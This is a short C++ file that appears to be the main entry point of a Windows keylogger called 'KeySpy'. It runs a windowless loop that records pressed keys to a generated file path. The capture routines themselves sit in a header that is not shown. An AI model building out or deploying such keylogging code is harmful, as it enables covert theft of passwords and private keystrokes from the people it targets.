#include "KeySpy.h"

//====================================================================================================

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    char path[MAX_STRING_SIZE];

    generateFilePath(path);
    if (!beginSession(path))
        return -1;

    while (isSessionContinue())
    {
        if (wasStatusKeysUpdate())
            rememberPressedKeys();
        Sleep(SLEEP_TIME);
    }

    endSession();
    return 0;
}
